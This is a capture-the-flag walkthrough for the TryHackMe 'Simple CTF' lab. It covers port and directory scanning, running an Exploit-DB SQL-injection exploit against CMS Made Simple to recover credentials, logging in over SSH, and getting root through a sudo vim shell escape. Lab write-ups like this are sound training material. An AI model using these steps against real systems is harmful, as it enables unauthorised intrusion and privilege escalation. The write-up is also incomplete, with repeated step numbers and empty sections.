# Room Information

Room link: [https://tryhackme.com/room/easyctf](https://tryhackme.com/room/easyctf)

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/25/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.70.173 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 20:59 EDT
Nmap scan report for 10.10.70.173
Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.54.63
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cannot get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.29 seconds
```

#
> Scanning for Hiddent Web Directories Using Dirb
4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.70.173 -r > WebDirectoryScan.txt 
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jun 26 11:29:05 2023
URL_BASE: http://10.10.70.173/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.70.173/ ----
+ http://10.10.70.173/index.html (CODE:200|SIZE:11321)  
+ http://10.10.70.173/robots.txt (CODE:200|SIZE:929)                
+ http://10.10.70.173/server-status (CODE:403|SIZE:300)                                       
==> DIRECTORY: http://10.10.70.173/simple/                                                                             
-----------------
END_TIME: Mon Jun 26 11:36:06 2023
DOWNLOADED: 4612 - FOUND: 3
```

# Vulnerability Identification
> Vulnerability Identification Using Exploit DB
6. `firefox http://{TARGET IP}/simple`
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/CMS%20Made%20Simple.png)
7. `searchsploit "CMS made simple 2.2.8" --www`
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit "CMS made simple 2.2.8" --www
----------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                         |  URL
----------------------------------------------------------------------- --------------------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                               | https://www.exploit-db.com/exploits/46635
----------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
```
8. `firefox "https://www.exploit-db.com/exploits/46635"`
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/CVE-2019-9053.png)

# Vulnerability Exploitation
> Exploiting CVE-2019-9053
9. Download the Python exploit
10. `cd downloads`
```bash
┌──(kali㉿kali)-[~]
└─$ cd Downloads                                                               
```
11. `ls`
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
 46635.py               
```
12. `python 46635.py`
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python 46635.py                                                       
  File "/home/kali/Downloads/46635.py", line 25
    print "[+] Specify an url target"
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
```
13. `gedit python 46635.py` to open up the Python exploit and add parantheses for every print command that's missing one (Lines 25, 26, 27, 28, 63, 69, and 183) as well as change it from using the **python** interpreter () to the **python3** interpreter ()
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ gedit 46635.py 
```
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py.png)
14. `python 46635.py`
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python 46635.py    
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```
15. `python 46635.py -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 46635.py -u http://10.10.130.66/simple --crack -w rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
[*] Now try to crack password
Traceback (most recent call last):
  File "/home/kali/Downloads/46635.py", line 184, in <module>
    crack_password()
  File "/home/kali/Downloads/46635.py", line 53, in crack_password
    for line in dict.readlines():
  File "/usr/lib/python3.10/codecs.py", line 322, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invalid continuation byte
```
16. `gedit 46635.py`


#
> Step
16. `ssh {USERNAME}@{TARGET IP} -p 2222`
```bash
┌──(kali㉿kali)-[~]
└─$ ssh mitch@10.10.130.66 -p 2222
mitch@10.10.130.66 password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$
```
17. `whoami`
18. `pwd`
19. `ls`
```bash
$ whoami
mitch
```
```bash
$ pwd
/home/mitch
```
```bash
$ ls
user.txt
```
20. `cat {FILE1}.txt`
```bash
$ cat user.txt
G00d j0b, keep up!
```

# Post Exploitation
> Privilege Escalation
21. `sudo -l`
```bash
$ sudo -l     
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
22. `firefox "https://gtfobins.github.io/" and search for vim
![]()
23. `sudo vim -c ':!/bin/sh'`
```bash
$ sudo vim -c ':!/bin/sh'
#
```
23. `whoami`
24. `cd /root`
25. `ls`
```bash
# whoami
root
```
```bash
# cd /root
```
```bash
# ls
root.txt
```
26. `cat root.txt`
```bash
# cat root.txt  
W3ll d0n3. You made it!
```

**Room completed!**

# Command History
> Step

# Dissecting the Commands
> Step

# Contibutions
> Step
